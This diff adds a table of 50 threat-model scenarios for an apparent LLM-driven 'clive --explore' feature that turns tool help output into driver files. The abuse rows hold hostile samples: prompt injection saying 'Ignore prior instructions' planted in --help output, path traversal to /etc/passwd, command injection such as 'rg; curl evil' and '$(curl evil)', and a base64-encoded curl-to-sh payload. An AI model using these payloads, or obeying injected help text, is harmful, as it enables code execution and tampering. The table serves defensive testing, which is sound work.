@@ -1,0 +1,51 @@
+iteration	dimension	classification	severity	title	description	parent
+1	happy_path	new	-	Baseline: explore ripgrep successfully	User runs --explore rg, all 5 probes return exit 0, driver written	-
+2	error_path	new	HIGH	LLM omits PATTERNS section	Synthesizer returns driver missing a required section	-
+3	edge_case	new	MEDIUM	Tool emits empty --help	--help completes with exit 0 but no stdout	-
+4	abuse	new	CRITICAL	Prompt injection via --help output	Malicious tool's --help contains "Ignore prior instructions" steering the synthesizer	-
+5	abuse	new	CRITICAL	Path traversal in tool name	User passes --explore "../../etc/passwd" or "rg/../../etc/cron"	-
+6	concurrent	new	HIGH	Two --explore same tool race	Parallel `clive --explore rg` in two terminals both reach write step	-
+7	abuse	new	HIGH	ANSI escape injection in --help	Terminal capture preserves ESC codes that re-write the screen the LLM "sees"	-
+8	integration	new	MEDIUM	tmux server not running	libtmux.Server cannot connect when SOCKET_NAME socket missing	-
+9	data_variation	new	MEDIUM	Tool name starting with hyphen	--explore -rf misparsed by argparse or treated as flag	-
+10	abuse	new	HIGH	CREDENTIAL_TOOLS bypass via alias/symlink	Attacker installs aws as awsx, or symlinks /usr/local/bin/foo → /usr/bin/aws	-
+11	permission	new	MEDIUM	drivers/ directory is read-only	chmod 555 drivers/ — write fails after exploration succeeds	-
+12	state_transition	new	HIGH	--explore-overwrite clobbers hand-written driver irreversibly	No backup of original before overwrite	-
+13	temporal	new	HIGH	Probe stalls — no per-probe timeout	`man <tool>` triggered PAGER and hung the pane until max_turns	-
+14	recovery	new	HIGH	Ctrl-C mid-exploration leaks tmux session + /tmp dir	KeyboardInterrupt bypasses finally cleanup for sessions opened pre-try	-
+15	scale	new	MEDIUM	Tool with 50,000-line --help	Massive output blows token budget in build_generation_prompt	-
+16	abuse	new	HIGH	Command injection via tool name in build_exploration_goal	tool_name="rg; curl evil" interpolated into LLM prompt steers exploration LLM	-
+17	edge_case	new	HIGH	tool_name="explore" collides with meta-driver	--explore explore would overwrite drivers/explore.md (the exploration driver itself)	-
+18	scale	new	MEDIUM	Synthesizer LLM emits 100MB driver	Adversarial cost amplification — max_tokens=1500 should bound, verify	#4
+19	integration	new	MEDIUM	LLM provider returns 429 mid-synthesis	Rate-limit during chat() call; no retry layer	-
+20	abuse+concurrent	new	CRITICAL	TOCTOU race: write between exists() check and open()	Two --explore-overwrite=False invocations slip past existence check	#6
+21	edge_case	new	MEDIUM	LLM emits BOM/whitespace before frontmatter	text.startswith("---") fails when text starts with ﻿ or "\n---"	-
+22	abuse	new	HIGH	PITFALLS section not required by validator	Synthesizer omits PITFALLS — destructive-flag warnings silently drop	-
+23	abuse	new	HIGH	Frontmatter value injection	preferred_mode: "$(curl evil)" or unicode-similar values bypass YAML parser	-
+24	data_variation	new	MEDIUM	env-var stripping eats CREDENTIAL_TOOLS guard	FOO=bar aws ls — env-var stripping in safety check passes "aws ls" but only after stripping FOO=bar	-
+25	edge_case	new	HIGH	max_turns=0 yields empty ExplorationResult	Bypass via API misuse: explore_tool("foo", max_turns=0) → 0 probes → synthesizer hallucinates	-
+26	integration	new	HIGH	No contract test for on_event "probe" event between runner and explorer	Future refactor of run_subtask_interactive silently drops the event explorer relies on	-
+27	abuse	new	HIGH	Tool prints PS1 marker [AGENT_READY] in its --help	Confuses byte-classifier into thinking the prompt returned mid-output	-
+28	recovery	new	MEDIUM	Target tool segfaults mid-probe	Exit code captured but pane state may be corrupted for next probe	-
+29	edge_case	new	MEDIUM	Tool found via $PATH but driver assumes default PATH	`which foo` succeeds but `foo` isn't on PATH for a future pane	-
+30	abuse	new	CRITICAL	Section regex passes; malicious payload smuggled inside PRIMARY TOOLS	Anchored regex finds `PRIMARY TOOLS:` at line start; content below is malicious	-
+31	scale	new	MEDIUM	drivers/ sprawl — no metadata to prune stale auto-gen drivers	After 100 explorations, can't distinguish stale from current	-
+32	temporal	new	MEDIUM	Driver written 6 months ago when tool flags have changed	Auto-gen header has date but no provenance/version-of-target	-
+33	abuse	new	HIGH	Social-engineered overwrite via copy-paste instructions	Attacker on Discord/Stack Overflow tells user "fix bug X by running clive --explore foo --explore-overwrite"	-
+34	edge_case	new	MEDIUM	Tool exits non-zero on --help	Some legacy/buggy tools return exit 1 from --help; ProbeOutcome.success=False but output is useful	-
+35	abuse	new	HIGH	Markdown heading prefix `## ENVIRONMENT` enables section spoofing in prose	Regex `^(?:#+\s+)?ENVIRONMENT\b` accepts headings, but body still freeform	-
+36	integration	new	MEDIUM	Clive runs in container without tmux	Docker/k8s deployments fail at _open_exploration_pane with unclear error	-
+37	abuse	new	MEDIUM	tldr cache poisoning steers exploration	Local ~/.tldr cache is user-writable; attacker plants malicious tldr page	-
+38	concurrent	new	MEDIUM	Parallel planner + --explore compete for tmux server	Manual --explore while a planner DAG is running creates session-name collisions	-
+39	edge_case	new	HIGH	Subcommand tools (git, cargo, kubectl) explored at top level only	Driver covers `git --help` but no subcommand surface; mostly useless	-
+40	state_transition	variant	MEDIUM	Re-explore of existing auto-gen driver without --explore-overwrite	User wants to refresh; current flow forces them to delete first or pass --explore-overwrite (= same risk as hand-written)	#33
+41	abuse	new	HIGH	Help text contains "Example: rm -rf $TMPDIR" — synthesizer copies into driver	Honest LLM verbatim-quotes dangerous example from help text	-
+42	recovery	new	HIGH	Disk full during write_generated_driver	open() succeeds, write() fails partway → corrupt driver lands	-
+43	abuse	new	CRITICAL	Base64-encoded payload in PRIMARY TOOLS bypasses content filter	`echo Y3VybCB8c2g= | base64 -d | sh` survives naive grep filters	#30
+44	temporal	new	LOW	Auto-gen date is wrong due to clock skew or wrong TZ	System clock set to 1970 or future; AUTO_GEN_HEADER_TEMPLATE.format(date=...) lies	-
+45	edge_case	new	HIGH	Case-collision on case-insensitive FS — `--explore RG` overwrites drivers/rg.md	macOS APFS default is case-insensitive; _SAFE_NAME accepts mixed case	-
+46	abuse	new	HIGH	tool name "explore.md" or "drivers" — abuses _SAFE_NAME `.` allowance	`--explore foo.md` writes drivers/foo.md.md (or .md.md collision); `--explore .` allowed?	-
+47	concurrent	new	HIGH	User edits drivers/foo.md by hand while --explore runs	Editor reads, clive writes; editor's later save clobbers fresh driver	-
+48	abuse	variant	CRITICAL	URL-encoded payload survives content filter	%63%75%72%6C ...	#43
+49	recovery	new	MEDIUM	Partial driver on disk has frontmatter but no body	open() succeeded, first write flushed, second write failed; result.md startswith("---") but missing sections	#42
+50	state_transition	new	HIGH	Auto-gen driver loaded by future pane silently; no quarantine for un-reviewed drivers	First use of newly-explored tool runs against an unvetted driver	-
